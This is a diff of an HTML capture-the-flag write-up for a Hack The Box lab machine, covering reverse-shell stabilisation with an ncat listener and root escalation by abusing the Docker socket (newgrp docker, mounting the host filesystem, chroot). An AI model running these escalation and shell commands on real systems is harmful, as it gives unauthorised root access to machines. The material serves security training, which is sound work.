-            <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2</span>
-<span class="out">/ #</span></pre>
           </div>
         </div>
-      </div>
 
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">3</div>
-          <div class="step-line"></div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// chroot into the host</div>
-          <p>Using <code>chroot</code> we pivot from the container's view into the host filesystem mounted at <code>/mnt</code>, giving us a full root shell on the actual machine.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">container → host</span>
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">4</div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// Stabilize the shell</div>
+            <p>The raw reverse shell is dumb — no tab completion, no arrow keys, and <kbd>Ctrl+C</kbd> kills the whole session. We upgrade it to a fully interactive TTY in three quick moves.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">terminal 1 — stabilize</span>
+              </div>
+              <pre><span class="cm"># 1. Spawn a proper PTY inside the reverse shell</span>
+  <span class="prompt">ben@kobold:~$ </span><span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+  <span class="out">ben@kobold:~$</span>
+
+  <span class="cm"># 2. Background the shell, then fix the local terminal settings</span>
+  <span class="prompt">ben@kobold:~$ </span><span class="cmd">^Z</span>
+  <span class="out">[1]+  Stopped                 ncat -lvp 4444</span>
+  <span class="prompt">$ </span><span class="cmd">stty raw -echo; fg</span>
+  <span class="out">ncat -lvp 4444</span>
+
+  <span class="cm"># 3. Set the terminal type so colours and clear work correctly</span>
+  <span class="prompt">ben@kobold:~$ </span><span class="cmd">export TERM=xterm</span>
+  <span class="prompt">ben@kobold:~$ </span></pre>
             </div>
-            <pre><span class="out">/ # </span><span class="cmd">chroot /mnt sh</span>
-<span class="out"># </span><span class="cmd">id</span>
-<span class="out">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+            <div class="callout info" style="margin-top:1rem">
+              <span class="callout-icon">ℹ</span>
+              <div>
+                <strong>Why each step matters</strong>
+                <code>pty.spawn</code> allocates a pseudo-terminal so the shell behaves like a real one. <code>stty raw -echo</code> stops our local terminal from intercepting keystrokes before they reach the remote shell. <code>fg</code> brings ncat back to the foreground with those settings active. Finally, <code>export TERM=xterm</code> lets programs like <code>nano</code> and <code>clear</code> render correctly.
+              </div>
+            </div>
           </div>
         </div>
+
+      </div>
+    </section>
+
+    <!-- SECTION 4 — USER FLAG -->
+    <section class="section" id="user-flag">
+      <div class="section-header">
+        <span class="section-num">04</span>
+        <h2>User Flag</h2>
+        <div class="section-line"></div>
       </div>
 
-    </div>
+      <p>With a shell as <code>ben</code>, the user flag is sitting right in the home directory.</p>
 
-    <div class="callout warning">
-      <span class="callout-icon">⚠</span>
-      <div>
-        <strong>Why this works</strong>
-        Access to the Docker socket is equivalent to root on the host. By mounting <code>/</code> and chrooting into it from within the container (which runs as root), all filesystem protections are bypassed entirely.
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+          <span class="tb-title">ben@kobold</span>
+        </div>
+        <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">cat user.txt</span>
+  <span class="flag-out">HTB{REDACTED}</span></pre>
       </div>
-    </div>
-  </section>
 
-  <!-- FLAG -->
-  <section class="section" id="flag">
-    <div class="section-header">
-      <span class="section-num">06</span>
-      <h2>Root Flag</h2>
-      <div class="section-line"></div>
-    </div>
-
-    <p>With a root shell on the host, we navigate to <code>/root</code> and collect the final flag.</p>
-
-    <div class="terminal">
-      <div class="terminal-bar">
-        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-        <span class="tb-title">root@kobold</span>
+      <div class="callout flag">
+        <span class="callout-icon">⚑</span>
+        <div>
+          <strong>User Flag Captured</strong>
+          CVE-2026-23520 gives us an unauthenticated shell straight into the box. First flag done — now let's escalate.
+        </div>
       </div>
-      <pre><span class="out"># </span><span class="cmd">cd /root</span>
-<span class="out"># </span><span class="cmd">ls</span>
-<span class="out">root.txt</span>
-<span class="out"># </span><span class="cmd">cat root.txt</span>
-<span class="flag-out">HTB{REDACTED}</span></pre>
-    </div>
+    </section>
 
-    <div class="flag-reveal">
-      <div class="flag-label">// Root Flag Captured</div>
-      <div class="flag-value" id="flag-text">HTB{REDACTED}</div>
+    <!-- SECTION 5 — PRIVESC -->
+    <section class="section" id="privesc">
+      <div class="section-header">
+        <span class="section-num">05</span>
+        <h2>Privilege Escalation via Docker Socket</h2>
+        <div class="section-line"></div>
+      </div>
+
+      <p>While enumerating the system we notice that Docker is running. However, <code>ben</code> is not in the <code>docker</code> group, so running docker commands fails.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+          <span class="tb-title">ben@kobold</span>
+        </div>
+        <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">docker ps</span>
+  <span class="out">permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied</span></pre>
+      </div>
+
+      <div class="steps">
+
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">1</div>
+            <div class="step-line"></div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// Add ourselves to the docker group</div>
+            <p>Despite the restriction, we can simply switch our active group to <code>docker</code> using <code>newgrp</code>, which gives us access to the Docker socket for the current session.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">ben@kobold</span>
+              </div>
+              <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">newgrp docker</span>
+  <span class="prompt">ben@kobold:~$ </span><span class="cmd">docker ps</span>
+  <span class="out">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+  4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 weeks ago   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
+  </span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">2</div>
+            <div class="step-line"></div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// Mount the host filesystem into a container</div>
+            <p>The PrivateBin image <code>privatebin/nginx-fpm-alpine:2.0.2</code> is already downloaded on the machine. We spin up a container as root (<code>-u 0</code>) and mount the entire host filesystem to <code>/mnt</code>.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">ben@kobold</span>
+              </div>
+              <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2</span>
+  <span class="out">/ #</span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">3</div>
+            <div class="step-line"></div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// chroot into the host</div>
+            <p>Using <code>chroot</code> we pivot from the container's view into the host filesystem mounted at <code>/mnt</code>, giving us a full root shell on the actual machine.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">container → host</span>
+              </div>
+              <pre><span class="out">/ # </span><span class="cmd">chroot /mnt sh</span>
+  <span class="out"># </span><span class="cmd">id</span>
+  <span class="out">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="callout warning">
+        <span class="callout-icon">⚠</span>
+        <div>
+          <strong>Why this works</strong>
+          Access to the Docker socket is equivalent to root on the host. By mounting <code>/</code> and chrooting into it from within the container (which runs as root), all filesystem protections are bypassed entirely.
+        </div>
+      </div>
+    </section>
+
+    <!-- FLAG -->
+    <section class="section" id="flag">
+      <div class="section-header">
+        <span class="section-num">06</span>
+        <h2>Root Flag</h2>
+        <div class="section-line"></div>
+      </div>
+
+      <p>With a root shell on the host, we navigate to <code>/root</code> and collect the final flag.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+          <span class="tb-title">root@kobold</span>
+        </div>
+        <pre><span class="out"># </span><span class="cmd">cd /root</span>
+  <span class="out"># </span><span class="cmd">ls</span>
+  <span class="out">root.txt</span>
+  <span class="out"># </span><span class="cmd">cat root.txt</span>
+  <span class="flag-out">HTB{REDACTED}</span></pre>
+      </div>
+
+      <div class="flag-reveal">
+        <div class="flag-label">// Root Flag Captured</div>
+        <div class="flag-value" id="flag-text">HTB{REDACTED}</div>
+      </div>
+    </section>
+    <section class="home-section">
+    <div class="home-section-head">
+      <span class="home-section-title">Related Writeups</span>
+      <a class="link" href="../writeups.html" class="home-section-link">View all →</a>
     </div>
-  </section>
-  <section class="home-section">
-  <div class="home-section-head">
-    <span class="home-section-title">Related Writeups</span>
-    <a class="link" href="../writeups.html" class="home-section-link">View all →</a>
-  </div>
-  <div class="writeups-grid">
-    <a href="./devarea.html" class="card" data-cat="WEB" data-diff="MEDIUM">
+    <div class="writeups-grid">
+      <a href="./devarea.html" class="card" data-cat="WEB" data-diff="MEDIUM">
+        <div class="card-top">
+          <div class="card-badges">
+            <span class="badge badge-web">WEB</span>
+            <span class="badge badge-medium">MEDIUM</span>
+          </div>
+        </div>
+        <div class="card-title">DevArea</div>
+        <div class="card-desc">XOP and Apache CXF exploitation, HoverFly RCE and Bash overwriting</div>
+        <div class="card-meta"><span>HTB 2026</span><span>Mar 31, 2026</span></div>
+      </a>
+      <a href="./silentium.html" class="card" data-cat="MISC" data-diff="EASY">
       <div class="card-top">
         <div class="card-badges">
-          <span class="badge badge-web">WEB</span>
-          <span class="badge badge-medium">MEDIUM</span>
+          <span class="badge badge-misc">MISC</span>
+          <span class="badge badge-easy">EASY</span>
         </div>
       </div>
-      <div class="card-title">DevArea</div>
-      <div class="card-desc">XOP and Apache CXF exploitation, HoverFly RCE and Bash overwriting</div>
-      <div class="card-meta"><span>HTB 2026</span><span>Mar 31, 2026</span></div>
+      <div class="card-title">Silentium</div>
+      <div class="card-desc">Flowise AI api exploitation, Docker Escape and Gogs CVE</div>
+      <div class="card-meta"><span>HTB 2026</span><span>Apr 13, 2026</span></div>
     </a>
-  </div>
-</section>
+    </div>
+  </section>
 
-  <!-- FOOTER -->
-  <footer class="writeup-footer">
-    <div class="author-block">
-      <div class="author-avatar"></div>
-      <div>
-        <div class="author-info-name">@Tomat0Buster</div>
-        <div class="author-info-role">Miscellaneous · TomatoBuster</div>
+    <!-- FOOTER -->
+    <footer class="writeup-footer">
+      <div class="author-block">
+        <div class="author-avatar"></div>
+        <div>
+          <div class="author-info-name">@Tomat0Buster</div>
+          <div class="author-info-role">Miscellaneous · TomatoBuster</div>
+        </div>
       </div>
-    </div>
-    <div class="footer-tags">
-      <span class="tag">web exploitation</span>
-      <span class="tag">CVE-2026-23520</span>
-      <span class="tag">docker socket abuse</span>
-      <span class="tag">privesc</span>
-      <span class="tag">MCP</span>
-    </div>
-  </footer>
+      <div class="footer-tags">
+        <span class="tag">web exploitation</span>
+        <span class="tag">CVE-2026-23520</span>
+        <span class="tag">docker socket abuse</span>
+        <span class="tag">privesc</span>
+        <span class="tag">MCP</span>
+      </div>
+    </footer>
 
-  <!-- SITE FOOTER -->
-  <footer class="site-footer">
-    <span class="site-footer-logo">TomatoBuster</span>
-    <span class="site-footer-copy">Built by TomatoBuster · 2026</span>
-  </footer>
+    <!-- SITE FOOTER -->
+    <footer class="site-footer">
+      <span class="site-footer-logo">TomatoBuster</span>
+      <span class="site-footer-copy">Built by TomatoBuster · 2026</span>
+    </footer>
 
-</div><!-- /page-wrap -->
+  </div><!-- /page-wrap -->
 
-<script src="../assets/script.js"></script>
-</body>
-</html>
+  <script src="../assets/script.js"></script>
+  </body>
+  </html>
